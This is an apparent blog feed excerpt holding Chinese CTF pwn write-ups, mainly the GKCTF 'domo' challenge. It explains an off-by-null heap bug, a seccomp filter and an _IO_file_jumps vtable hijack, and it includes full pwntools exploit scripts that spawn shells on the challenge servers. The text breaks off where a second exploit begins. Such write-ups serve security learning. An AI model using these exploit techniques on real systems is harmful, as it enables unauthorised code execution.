class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level =<span class="string">'DEBUG'</span></span><br><span class="line">p= process(<span class="string">'./main'</span>)</span><br><span class="line">p = remote(<span class="string">'183.129.189.60'</span>,<span class="number">10001</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'username:'</span>,<span class="string">'%*18$d%5$n'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,"b *0x401512")</span></span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">pop_rdi_ret = <span class="number">0x401733</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x401731</span></span><br><span class="line">binsh  =<span class="number">0x404090</span></span><br><span class="line">system = <span class="number">0x401110</span></span><br><span class="line">read_got = <span class="number">0x404038</span></span><br><span class="line">gadget_I = <span class="number">0x40172A</span></span><br><span class="line">gadget_Ii = <span class="number">0x401710</span></span><br><span class="line">payload  = <span class="string">'U'</span>*<span class="number">0x118</span></span><br><span class="line">payload += p64(gadget_I)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(<span class="number">8</span>)</span><br><span class="line">payload += p64(read_got)</span><br><span class="line">payload += p64(gadget_Ii)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(binsh) + p64(system)</span><br><span class="line">p.recvuntil(<span class="string">'message'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.send(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;盲打1-盲打2&quot;&gt;&lt;a href=&quot;#盲打1-盲打2&quot; class=&quot;headerlink&quot; title=&quot;盲打1 盲打2&quot;&gt;&lt;/a&gt;盲打1 盲打2&lt;/h2&gt;&lt;p&gt;都是一个c语言解释器，但是不能用&lt;code&gt;()&lt;/code&gt;来写c语言，也就是不能调用函数，可以用
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>GKCTF pwn writeup</title>
    <link href="https://nocbtm.github.io/2020/05/24/GKCTF-pwn-writeup/"/>
    <id>https://nocbtm.github.io/2020/05/24/GKCTF-pwn-writeup/</id>
    <published>2020-05-24T10:04:51.000Z</published>
    <updated>2020-05-28T01:26:57.702Z</updated>
    
    <content type="html"><![CDATA[<h2 id="domo"><a href="#domo" class="headerlink" title="domo"></a>domo</h2><p>一道 domo日了一天，最后还是做出来，还是很高兴的</p><p><code>off-by-null</code>漏洞，edit功能有任意地址一字节写入，可以用来伪造堆块的size，<code>malloc_fook</code>和<code>free_hook</code>程序做有限制，然后又有<code>sanbox</code>。但是是在main函数结束的时候才生效的，只要在while循环里面调用<code>onegadget</code>，还是能反弹shell的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x07 0xc000003e  <span class="keyword">if</span> (A != ARCH_X86_64) goto 0009</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  <span class="keyword">if</span> (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x04 0xffffffff  <span class="keyword">if</span> (A != 0xffffffff) goto 0009</span><br><span class="line"> 0005: 0x15 0x03 0x00 0x0000000a  <span class="keyword">if</span> (A == mprotect) goto 0009</span><br><span class="line"> 0006: 0x15 0x02 0x00 0x0000003b  <span class="keyword">if</span> (A == execve) goto 0009</span><br><span class="line"> 0007: 0x15 0x01 0x00 0xffffd8b6  <span class="keyword">if</span> (A == 0xffffd8b6) goto 0009</span><br><span class="line"> 0008: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0009: 0x06 0x00 0x00 0x00000000  <span class="built_in">return</span> KILL</span><br></pre></td></tr></table></figure><p>一开始的思路是想用 <code>environ</code>来泄露 <code>stack_addr</code>然后再申请堆块到栈上用<code>orw</code>的方式来做</p><p>然后费了好大的劲，泄露出stack的地址了，stack上没有合适的size而且还有麻烦的<code>canary</code></p><p>最后选择伪造 <code>_IO_2_1_stdin_</code>的<code>vtable</code>为heap地址，heap里面存放着<code>onegadget</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p stdin</span><br><span class="line">$1 = (struct _IO_FILE *) 0x7f991f79b8e0 &lt;_IO_2_1_stdin_&gt;</span><br><span class="line">pwndbg&gt; p *(struct _IO_FILE_plus *) 0x7f991f79b8e0</span><br><span class="line">$2 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -72539512, </span><br><span class="line">    _IO_read_ptr = 0x557376e64010 &quot;96\n\n95634794904\n&quot;, </span><br><span class="line">    _IO_read_end = 0x557376e64010 &quot;96\n\n95634794904\n&quot;, </span><br><span class="line">    _IO_read_base = 0x557376e64010 &quot;96\n\n95634794904\n&quot;, </span><br><span class="line">    _IO_write_base = 0x557376e64010 &quot;96\n\n95634794904\n&quot;, </span><br><span class="line">    _IO_write_ptr = 0x557376e64010 &quot;96\n\n95634794904\n&quot;, </span><br><span class="line">    _IO_write_end = 0x557376e64010 &quot;96\n\n95634794904\n&quot;, </span><br><span class="line">    _IO_buf_base = 0x557376e64010 &quot;96\n\n95634794904\n&quot;, </span><br><span class="line">    _IO_buf_end = 0x557376e65010 &quot;&quot;, </span><br><span class="line">    _IO_save_base = 0x0, </span><br><span class="line">    _IO_backup_base = 0x0, </span><br><span class="line">    _IO_save_end = 0x0, </span><br><span class="line">    _markers = 0x0, </span><br><span class="line">    _chain = 0x0, </span><br><span class="line">    _fileno = 0, </span><br><span class="line">    _flags2 = 16, </span><br><span class="line">    _old_offset = -1, </span><br><span class="line">    _cur_column = 0, </span><br><span class="line">    _vtable_offset = 0 &apos;\000&apos;, </span><br><span class="line">    _shortbuf = &quot;&quot;, </span><br><span class="line">    _lock = 0x7f991f79d790 &lt;_IO_stdfile_0_lock&gt;, </span><br><span class="line">    _offset = -1, </span><br><span class="line">    _codecvt = 0x0, </span><br><span class="line">    _wide_data = 0x7f991f79b9c0 &lt;_IO_wide_data_0&gt;, </span><br><span class="line">    _freeres_list = 0x0, </span><br><span class="line">    _freeres_buf = 0x0, </span><br><span class="line">    __pad5 = 113, </span><br><span class="line">    _mode = -1, </span><br><span class="line">    _unused2 = &apos;\000&apos; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = 0x7f991f79a6e0 &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实际上是伪造 <code>_IO_file_jumps</code>结构体</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p _IO_file_jumps</span><br><span class="line">$3 = &#123;</span><br><span class="line">  __dummy = 0, </span><br><span class="line">  __dummy2 = 0, </span><br><span class="line">  __finish = 0x7f991f4509c0 &lt;_IO_new_file_finish&gt;, </span><br><span class="line">  __overflow = 0x7f991f451730 &lt;_IO_new_file_overflow&gt;, </span><br><span class="line">  __underflow = 0x7f991f4514a0 &lt;_IO_new_file_underflow&gt;, </span><br><span class="line">  __uflow = 0x7f991f452600 &lt;__GI__IO_default_uflow&gt;, </span><br><span class="line">  __pbackfail = 0x7f991f453980 &lt;__GI__IO_default_pbackfail&gt;, </span><br><span class="line">  __xsputn = 0x7f991f4501e0 &lt;_IO_new_file_xsputn&gt;, </span><br><span class="line">  __xsgetn = 0x7f991f44fec0 &lt;__GI__IO_file_xsgetn&gt;, </span><br><span class="line">  __seekoff = 0x7f991f44f4c0 &lt;_IO_new_file_seekoff&gt;, </span><br><span class="line">  __seekpos = 0x7f991f452a00 &lt;_IO_default_seekpos&gt;, </span><br><span class="line">  __setbuf = 0x7f991f44f430 &lt;_IO_new_file_setbuf&gt;, </span><br><span class="line">  __sync = 0x7f991f44f370 &lt;_IO_new_file_sync&gt;, </span><br><span class="line">  __doallocate = 0x7f991f444180 &lt;__GI__IO_file_doallocate&gt;, </span><br><span class="line">  __read = 0x7f991f4501a0 &lt;__GI__IO_file_read&gt;, </span><br><span class="line">  __write = 0x7f991f44fb70 &lt;_IO_new_file_write&gt;, </span><br><span class="line">  __seek = 0x7f991f44f970 &lt;__GI__IO_file_seek&gt;, </span><br><span class="line">  __close = 0x7f991f44f340 &lt;__GI__IO_file_close&gt;, </span><br><span class="line">  __stat = 0x7f991f44fb60 &lt;__GI__IO_file_stat&gt;, </span><br><span class="line">  __showmanyc = 0x7f991f453af0 &lt;_IO_default_showmanyc&gt;, </span><br><span class="line">  __imbue = 0x7f991f453b00 &lt;_IO_default_imbue&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>先利用<code>unsortedbin_attack</code>泄露出libc基址和heap地址</p><p>然后 <code>off-by-null</code>溢出修改下一个堆块的 size 为 <code>\x00</code>使得他被修改为释放过的</p><p>通过布局，unlink使得堆块向前合并，造成堆块重叠，<code>fastbin_attack</code> 打<code>vtable</code>,需要用edit功能提前伪造size。</p><p><code>_IO_file_jumps</code>里面全放<code>onegadget</code>然后劫持程序执行流 ，生效的是<code>__xsputn</code>这里的<code>onegadget</code></p><p>看下puts函数的具体实现</p><p>代码来自：<a href="https://code.woboq.org/userspace/glibc/" target="_blank" rel="noopener">glibc</a>/<a href="https://code.woboq.org/userspace/glibc/libio/" target="_blank" rel="noopener">libio</a>/<a href="https://code.woboq.org/userspace/glibc/libio/ioputs.c.html" target="_blank" rel="noopener">ioputs.c</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_puts (<span class="keyword">const</span> <span class="keyword">char</span> *str)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> result = EOF;</span><br><span class="line">  <span class="keyword">size_t</span> len = <span class="built_in">strlen</span> (str);</span><br><span class="line">  _IO_acquire_lock (<span class="built_in">stdout</span>);</span><br><span class="line">    </span><br><span class="line">  <span class="keyword">if</span> ((_IO_vtable_offset (<span class="built_in">stdout</span>) != <span class="number">0</span></span><br><span class="line">       || _IO_fwide (<span class="built_in">stdout</span>, <span class="number">-1</span>) == <span class="number">-1</span>)</span><br><span class="line">      &amp;&amp; _IO_sputn (<span class="built_in">stdout</span>, str, len) == len</span><br><span class="line">      &amp;&amp; _IO_putc_unlocked (<span class="string">'\n'</span>, <span class="built_in">stdout</span>) != EOF)</span><br><span class="line">    result = MIN (INT_MAX, len + <span class="number">1</span>);</span><br><span class="line">    </span><br><span class="line">  _IO_release_lock (<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里实际上是调用了<code>_IO_sputn</code>这个函数，当然这个<code>_IO_sputn</code>实际上就是一个宏，调用了<code>_IO_2_1_stdout_</code>的vtable中的<code>__xsputn</code>，也就是<code>_IO_new_file_xsputn</code>函数。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">pwn_name = <span class="string">"domo"</span></span><br><span class="line">arch = <span class="string">'64'</span></span><br><span class="line">version = <span class="string">'2.23'</span></span><br><span class="line">ip, port = <span class="string">'node3.buuoj.cn'</span>,<span class="number">29246</span></span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line"><span class="comment">#context(os='linux', arch='amd64')</span></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./'</span>+pwn_name)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(ip,port)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(pwn_name,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_one</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span>(arch == <span class="string">'64'</span>):</span><br><span class="line">        <span class="keyword">if</span>(version == <span class="string">'2.23'</span>):</span><br><span class="line">            one = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line">        <span class="keyword">if</span> (version == <span class="string">'2.27'</span>):</span><br><span class="line">            one = [<span class="number">0x4f2c5</span> , <span class="number">0x4f322</span> , <span class="number">0x10a38c</span>]</span><br><span class="line">    <span class="keyword">return</span> one</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sym</span><span class="params">(func)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(func , libc.sym[func]))</span><br><span class="line">    <span class="keyword">return</span> libc.sym[func]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span><span class="params">(con,leak)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(con,leak))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\nc\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line">one = get_one()</span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------heap-------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chioce</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>,str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,data)</span>:</span></span><br><span class="line">    chioce(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"\n"</span>,str(size))</span><br><span class="line">    p.sendafter(<span class="string">"\n"</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    chioce(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"\n"</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, data)</span>:</span></span><br><span class="line">    chioce(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"\n"</span>,str(index))</span><br><span class="line">    p.sendafter(<span class="string">"\n"</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    chioce(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'\x12'</span>*<span class="number">8</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x13'</span>*<span class="number">0x60</span> + p64(<span class="number">0x110</span> + <span class="number">0x70</span>))<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x110</span>,p64(<span class="number">0x21</span>)*<span class="number">32</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">'\x15'</span>*<span class="number">8</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"\x16"</span>*<span class="number">0x60</span> + p64(<span class="number">0x110</span> + <span class="number">0x70</span>))<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x110</span>,p64(<span class="number">0x21</span>)*<span class="number">32</span>)<span class="comment">#5</span></span><br><span class="line"><span class="comment">#---------------leak libc heap addr--------------------</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">"a"</span>*<span class="number">8</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">'\x15'</span>*<span class="number">8</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">leak=u64(p.recvuntil(<span class="string">'\x0a'</span>)[<span class="number">-7</span>:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">heap=leak<span class="number">-0x55b3d7aa52b0</span>+<span class="number">0x55b3d7aa5010</span></span><br><span class="line">info(<span class="string">"leak"</span>,leak)</span><br><span class="line">info(<span class="string">"heap"</span>,heap)</span><br><span class="line"></span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">leak=u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc.address=leak<span class="number">-0x7f2534dafb78</span>+<span class="number">0x7f25349eb000</span></span><br><span class="line">info(<span class="string">"leak"</span>,leak)</span><br><span class="line">info(<span class="string">"libc"</span>,libc.address)</span><br><span class="line"></span><br><span class="line">environ=libc.sym[<span class="string">"environ"</span>]</span><br><span class="line">_IO_list_all=libc.address+<span class="number">0x7f97b2172520</span><span class="number">-0x7f97b1dad000</span></span><br><span class="line">io_stdin_vtable=libc.address+<span class="number">0x7f07aec479b0</span><span class="number">-0x7f07ae883000</span></span><br><span class="line">info(<span class="string">"environ"</span>,environ)</span><br><span class="line">info(<span class="string">"io_stdin_vtable"</span>,io_stdin_vtable)</span><br><span class="line">pause()</span><br><span class="line"><span class="comment">#------------------- unlink-------------</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x13'</span>*<span class="number">0x60</span> + p64(<span class="number">0x110</span> + <span class="number">0x70</span>))<span class="comment">#1</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------fastbin attack + fake vtable-------</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x120</span>,<span class="string">'\x12'</span>*<span class="number">0x100</span>+p64(<span class="number">0x110</span>)+p64(<span class="number">0x70</span>)+p64(io_stdin_vtable<span class="number">-0x20</span>)) <span class="comment">#1</span></span><br><span class="line">edit(io_stdin_vtable<span class="number">-0x18</span>,<span class="string">"\x71"</span>)</span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">2</span>+p64(one[<span class="number">2</span>]+libc.address)*<span class="number">19</span>+p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">add(<span class="number">0x100</span>,payload)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">"\x17"</span>*<span class="number">8</span>) <span class="comment">#</span></span><br><span class="line">add(<span class="number">0x60</span>,p64(<span class="number">0xffffffff</span>)+<span class="string">"\x00"</span>*<span class="number">0x10</span>+p64(heap+<span class="number">0x140</span>)) <span class="comment">#2</span></span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">free(0)</span></span><br><span class="line"><span class="string">add(0x120,'\x12'*0x100+p64(0x110)+p64(0x70)+p64(io_sdtout-0x43)) #1</span></span><br><span class="line"><span class="string">add(0x68,"\x17"*0x10) #</span></span><br><span class="line"><span class="string">payload='\x01'*0x33+p64(0xfbad1800)+p64(0)*3+p64(environ)+p64(environ+0x8)+ p64(environ+0x8)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">add(0x68,payload) #2</span></span><br><span class="line"><span class="string">dbg()</span></span><br><span class="line"><span class="string">leak=u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))</span></span><br><span class="line"><span class="string">rbp=leak-0x7ffc34284dd8+0x7ffc34284ce0</span></span><br><span class="line"><span class="string">info("leak",leak)</span></span><br><span class="line"><span class="string">info("rbp",rbp)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><h3 id="其他思路"><a href="#其他思路" class="headerlink" title="其他思路"></a>其他思路</h3><p>赛后看了官方的writeup，预期解跟我刚开始的思路差不多，只不过攻击方式不同</p><p>他是先修改<code>_IO_2_1_stdout_</code>来实现泄露stack地址，</p><p>接着改写 <code>_IO_2_1_stdin_</code>来实现向stack上写ROP链</p><p>有一些细节，需要注意到。修改 <code>_IO_2_1_stdout_</code>泄露出栈地址后，<code>puts</code>函数输出的字符不会加换行符了</p><p>具体原因还不清楚，有知道的师傅可以交流一波</p><h3 id="exp2"><a href="#exp2" class="headerlink" title="exp2"></a>exp2</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span 